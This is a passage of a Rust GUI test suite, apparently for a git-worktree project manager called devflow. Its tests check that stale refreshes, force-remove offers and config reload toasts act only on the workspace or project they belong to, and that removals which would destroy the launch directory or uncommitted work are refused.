    let edited = format!("{}# edited\n", doc_b.content);
    save(cx, edited.clone(), b_identity);
    assert_eq!(read(&entry_b), edited);
    assert_eq!(read(&entry_a), doc_a.content);
    frame(cx, &h, |_| {});
    assert_eq!(config_text(cx, &h), edited, "the saved document is current");
}

fn refreshed(h: &Harness, cx: &mut TestAppContext, daemon: &str) -> Refreshed {
    let (project, workspaces) = cx.read_entity(&h.state, |s, _| {
        let model = s.selection.current().unwrap();
        (model.project.clone().unwrap(), model.workspaces.clone())
    });
    Refreshed {
        project,
        workspaces: Ok(workspaces),
        database: DatabaseModel::default(),
        trust: Ok(TrustState::Trusted),
        pitchfork: Some(PitchforkModel {
            loaded: true,
            available: true,
            daemons: vec![Daemon {
                id: daemon.into(),
                status: "running".into(),
                pid: None,
                dir: None,
            }],
            error: None,
        }),
        config: None,
        logs: None,
    }
}

#[gpui_kit::test]
fn a_refresh_for_another_workspace_is_dropped(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    let daemons = |cx: &mut TestAppContext| {
        cx.read_entity(&h.state, |s, _| {
            s.selection
                .current()
                .unwrap()
                .pitchfork
                .daemons
                .iter()
                .map(|d| d.id.clone())
                .collect::<Vec<_>>()
        })
    };
    let apply = |cx: &mut TestAppContext, stamp, daemon: &str| {
        let result: Result<Refreshed, LoadError> = Ok(refreshed(&h, cx, daemon));
        update(cx, &h, |s, cx| {
            // One slot beyond the limit: the follow-up refresh must not start.
            s.inflight = MAX_JOBS + 1;
            s.apply_refresh(stamp, false, result, cx)
        });
    };

    // A refresh for "main" is running when the user picks "feature-x" ...
    let for_main = update(cx, &h, |s, _| {
        s.selection.current_mut().unwrap().begin_refresh()
    });
    update(cx, &h, |s, cx| s.select_workspace("feature-x".into(), cx));
    // ... and main's daemons arrive afterwards.
    apply(cx, for_main, "main/web");
    assert!(
        daemons(cx).is_empty(),
        "main's daemons must not be shown under feature-x: {:?}",
        daemons(cx)
    );
    assert_eq!(
        cx.read_entity(&h.state, |s, _| s
            .selection
            .current()
            .unwrap()
            .selected_workspace
            .clone()),
        Some("feature-x".to_string())
    );

    // The refresh for the current workspace is applied.
    let for_feature = update(cx, &h, |s, _| {
        s.selection.current_mut().unwrap().begin_refresh()
    });
    apply(cx, for_feature, "feature-x/web");
    assert_eq!(daemons(cx), ["feature-x/web"]);

    // An older refresh finishing after a newer one started is dropped too.
    let older = update(cx, &h, |s, _| {
        s.selection.current_mut().unwrap().begin_refresh()
    });
    let newer = update(cx, &h, |s, _| {
        s.selection.current_mut().unwrap().begin_refresh()
    });
    apply(cx, older, "stale/web");
    assert_eq!(daemons(cx), ["feature-x/web"]);
    apply(cx, newer, "fresh/web");
    assert_eq!(daemons(cx), ["fresh/web"]);
}

#[gpui_kit::test]
fn a_stale_force_remove_offer_cannot_target_another_project(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |_| {});
    // The offer a failed removal of "shop"'s feature-x left behind ...
    let target = cx.read_entity(&h.state, |s, _| {
        s.selection
            .current()
            .unwrap()
            .workspace_ref("feature-x")
            .unwrap()
    });
    // ... is clicked after another project (with a feature-x of its own) was selected.
    update(cx, &h, |s, cx| {
        select_other_project(s);
        cx.notify();
    });
    update(cx, &h, |_, cx| {
        cx.emit(AppEvent::OfferForceRemove {
            target,
            keep_data: false,
            delete_branch: false,
        })
    });
    frame(cx, &h, |window| {
        assert!(
            window.try_find("delete-branch").is_none(),
            "no removal dialog may open for the other project"
        );
    });
}

#[gpui_kit::test]
fn the_log_viewer_follows_a_log_whose_tail_window_keeps_its_length(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    update(cx, &h, |s, cx| s.set_tab(Tab::Logs, cx));
    let show = |cx: &mut TestAppContext, text: String| {
        update(cx, &h, |s, cx| {
            s.selection.current_mut().unwrap().logs.content = Some(Ok(text));
            cx.notify();
        })
    };
    let viewer = |cx: &mut TestAppContext| {
        cx.update(|cx| {
            let logs = h.shell.read(cx).project.read(cx).logs.clone();
            logs.read(cx).text(cx)
        })
    };
    // Same path, same length: only the content moved (the tail of a log that
    // grew past the 512 KiB window looks exactly like this).
    let tail = |last: char| format!("{}{last}", "x".repeat(4096));
    show(cx, tail('a'));
    frame(cx, &h, |_| {});
    assert!(viewer(cx).ends_with('a'));
    show(cx, tail('b'));
    frame(cx, &h, |_| {});
    assert!(
        viewer(cx).ends_with('b'),
        "the viewer stalled on the old tail"
    );
}

#[gpui_kit::test]
fn removing_the_workspace_the_app_was_started_in_is_refused(cx: &mut TestAppContext) {
    use crate::ops::RemoveChoice;
    let scratch = scratch_project();
    let h = open_scratch(cx, &scratch);
    create_workspace(cx, &h, "feature-c");
    let (target, path) = cx.read_entity(&h.state, |s, _| {
        let model = s.selection.current().unwrap();
        (
            model.workspace_ref("feature-c").unwrap(),
            model.workspace("feature-c").unwrap().workspace.path.clone(),
        )
    });
    // Started from inside that workspace (a terminal opened there).
    update(cx, &h, |s, _| s.launch_dir = Some(path.clone()));

    cx.update_window(h.window.into(), |_, window, cx| {
        h.state.update(cx, |s, cx| {
            s.remove_workspace(
                target.clone(),
                RemoveChoice::default(),
                TrustChoice::NotNeeded,
                window,
                cx,
            )
        });
    })
    .unwrap();
    settle(cx, &h, |s| s.busy().is_none());
    cx.read_entity(&h.state, |s, _| {
        let outcome = &s.activity.as_ref().unwrap().outcome;
        assert!(
            matches!(outcome, Some(Err(e)) if e.contains("current directory")),
            "{outcome:?}"
        );
        assert!(
            s.selection
                .current()
                .unwrap()
                .workspace("feature-c")
                .is_some()
        );
    });
    assert!(path.exists(), "nothing was removed");
    // The caller's own workspace is not a protection `force` overrides (core's
    // `Protected { forceable: false }`), so no "Force remove" is offered.
    // The toast slides in on the wall clock.
    std::thread::sleep(std::time::Duration::from_millis(450));
    frame(cx, &h, |window| {
        assert!(
            window.try_find("force-remove").is_none(),
            "forcing cannot override the launch-directory protection"
        );
    });
}

// ---- round-2 review regressions -------------------------------------------

fn git(dir: &std::path::Path, args: &[&str]) {
    let status = std::process::Command::new("git")
        .args(["-c", "user.name=t", "-c", "user.email=t@example.com"])
        .args(args)
        .current_dir(dir)
        .status()
        .unwrap();
    assert!(status.success(), "git {args:?}");
}

#[gpui_kit::test]
fn a_stale_removal_is_refused_by_core_forced_or_not_and_never_offers_force(
    cx: &mut TestAppContext,
) {
    use crate::ops::{RemoveChoice, TrustChoice};
    let scratch = scratch_project();
    let h = open_scratch(cx, &scratch);
    create_workspace(cx, &h, "feature-d");
    let (stale_list, target) = cx.read_entity(&h.state, |s, _| {
        let model = s.selection.current().unwrap();
        (
            model.workspaces.clone(),
            model.workspace_ref("feature-d").unwrap(),
        )
    });
    assert!(target.instance_id.is_some(), "it was set up by devflow");
    let (root, old_path) = (scratch.entry.root.clone(), target.path.clone());

    // Outside the app, A is removed and the branch comes back at path B,
    // where there is work that exists nowhere else.
    git(
        &root,
        &["worktree", "remove", "--force", old_path.to_str().unwrap()],
    );
    let new_path = scratch._outer.path().join("recreated-feature-d");
    git(
        &root,
        &["worktree", "add", new_path.to_str().unwrap(), "feature-d"],
    );
    let precious = new_path.join("precious.txt");
    std::fs::write(&precious, "uncommitted work").unwrap();

    // The app's cached view still shows A, and the user submits their removal.
    let submit = |cx: &mut TestAppContext, force: bool| {
        settle(cx, &h, |s| s.inflight == 0 && s.busy().is_none());
        cx.update_window(h.window.into(), |_, window, cx| {
            window.clear_notifications(cx);
            h.state.update(cx, |s, cx| {
                s.selection.current_mut().unwrap().workspaces = stale_list.clone();
                s.remove_workspace(
                    target.clone(),
                    RemoveChoice {
                        force,
                        ..RemoveChoice::default()
                    },
                    TrustChoice::NotNeeded,
                    window,
                    cx,
                )
            });
        })
        .unwrap();
        assert!(
            cx.read_entity(&h.state, |s, _| s.busy().is_some()),
            "the stale request reached core: the cached view still showed A"
        );
        settle(cx, &h, |s| s.busy().is_none());
        cx.read_entity(&h.state, |s, _| {
            let outcome = &s.activity.as_ref().unwrap().outcome;
            assert!(
                matches!(outcome, Some(Err(_))),
                "force={force}: {outcome:?}"
            );
        });
        assert!(
            precious.exists(),
            "force={force}: the recreated workspace and its file survived"
        );
    };

    submit(cx, false);
    // The refusal is an error, and "Force remove" is not on offer.
    // The toast slides in on the wall clock.
    std::thread::sleep(std::time::Duration::from_millis(450));
    frame(cx, &h, |window| {
        assert!(
            window.try_find("force-remove").is_none(),
            "a stale expectation is not a protection that force overrides"
        );
    });

    // Even a forced removal cannot reach it.
    submit(cx, true);
    assert!(new_path.join("precious.txt").exists());
}

fn two_projects(dir: &std::path::Path) -> [(Entry, ConfigDocument); 2] {
    ["alpha", "beta"].map(|name| {
        let root = dir.join(name);
        std::fs::create_dir_all(&root).unwrap();
        let id = Uuid::new_v4();
        std::fs::write(root.join("devflow.toml"), Config::template(name, id, None)).unwrap();
        let entry = Entry {
            id,
            name: name.into(),
            root: root.clone(),
        };
        (entry, ConfigDocument::open(&root).unwrap())
    })
}

fn load_config_of(state: &mut AppState, entry: &Entry, doc: &ConfigDocument) {
    if !state.entries.iter().any(|e| e.id == entry.id) {
        state.entries.push(entry.clone());
    }
    state.selection.select(entry.clone());
    let model = state.selection.current_mut().unwrap();
    model.phase = LoadPhase::Ready;
    model.config = Some(ConfigModel::new(doc.clone(), entry.id, &entry.root));
}

/// Type `text` into the Config tab's editor.
fn type_config(cx: &mut TestAppContext, h: &Harness, text: &str) {
    let editor = cx.update(|cx| h.shell.read(cx).project.read(cx).config.clone());
    cx.update_window(h.window.into(), |_, window, cx| {
        editor.update(cx, |view, cx| view.set_text(text.into(), window, cx))
    })
    .unwrap();
}

/// Save A's text while its file was changed behind the app's back: the save is
/// refused and the "changed on disk" toast with its Reload button appears.
fn refuse_save_of_changed_file(
    cx: &mut TestAppContext,
    h: &Harness,
    entry: &Entry,
    doc: &ConfigDocument,
) -> String {
    let changed = format!("{}# changed on disk\n", doc.content);
    std::fs::write(entry.root.join("devflow.toml"), &changed).unwrap();
    let loaded = cx.read_entity(&h.state, |s, _| {
        s.selection
            .current()
            .unwrap()
            .config
            .as_ref()
            .unwrap()
            .identity
            .clone()
    });
    cx.update_window(h.window.into(), |_, window, cx| {
        window.clear_notifications(cx);
        h.state.update(cx, |s, cx| {
            s.save_config(format!("{}# mine\n", doc.content), loaded, window, cx)
        })
    })
    .unwrap();
    cx.run_until_parked();
    frame(cx, h, |_| {});
    // The toast slides in on the wall clock.
    std::thread::sleep(std::time::Duration::from_millis(450));
    frame(cx, h, |window| {
        assert!(
            window.find("reload-config").visible(),
            "the toast offers Reload"
        )
    });
    changed
}

fn click_reload_in_toast(cx: &mut TestAppContext, h: &Harness) {
    cx.update_window(h.window.into(), |_, window, cx| {
        window.hover("reload-config", cx);
        window.click("reload-config", cx);
    })
    .unwrap();
    for _ in 0..5 {
        cx.executor()
            .advance_clock(std::time::Duration::from_millis(150));
        cx.run_until_parked();
    }
    frame(cx, h, |_| {});
}

#[gpui_kit::test]
fn a_changed_on_disk_toast_reload_reloads_its_own_project(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let [(entry_a, doc_a), _] = two_projects(dir.path());
    let h = open(cx, |s| {
        load_config_of(s, &entry_a, &doc_a);
        s.tab = Tab::Config;
    });
    frame(cx, &h, |_| {});
    let changed = refuse_save_of_changed_file(cx, &h, &entry_a, &doc_a);
    type_config(cx, &h, "# my unsaved edit\n");

    click_reload_in_toast(cx, &h);
    assert_eq!(
        config_text(cx, &h),
        changed,
        "Reload shows what is on disk for the project it was offered for"
    );
}

#[gpui_kit::test]
fn a_changed_on_disk_toast_cannot_reload_another_project_over_its_unsaved_edits(
    cx: &mut TestAppContext,
) {
    let dir = tempfile::tempdir().unwrap();
    let [(entry_a, doc_a), (entry_b, doc_b)] = two_projects(dir.path());
    let h = open(cx, |s| {
        load_config_of(s, &entry_a, &doc_a);
        s.tab = Tab::Config;
    });
    frame(cx, &h, |_| {});
    // A's file changed under the editor: the toast offers A's Reload.
    refuse_save_of_changed_file(cx, &h, &entry_a, &doc_a);

    // The user moves on to B and starts editing it.
    update(cx, &h, |s, cx| {
        load_config_of(s, &entry_b, &doc_b);
        cx.notify();
    });
    frame(cx, &h, |_| {});
    let identity = |cx: &mut TestAppContext| {
        cx.read_entity(&h.state, |s, _| {
            s.selection
                .current()
                .unwrap()
                .config
                .as_ref()
                .unwrap()
                .identity
                .clone()
        })
    };
    let b_identity = identity(cx);
    let edit = format!("{}# unsaved edit of B\n", doc_b.content);
    type_config(cx, &h, &edit);
    frame(cx, &h, |_| {});

    // A's toast is still on screen; its Reload must not touch B.
    frame(cx, &h, |window| {
        assert!(
            window.find("reload-config").visible(),
            "A's toast is still shown"
        )
    });
    click_reload_in_toast(cx, &h);
    assert_eq!(identity(cx), b_identity, "B's document was not reloaded");
    assert_eq!(config_text(cx, &h), edit, "B's unsaved edit survived");
    assert_eq!(
        std::fs::read_to_string(entry_b.root.join("devflow.toml")).unwrap(),
        doc_b.content,
        "B's file was not written"
    );
}
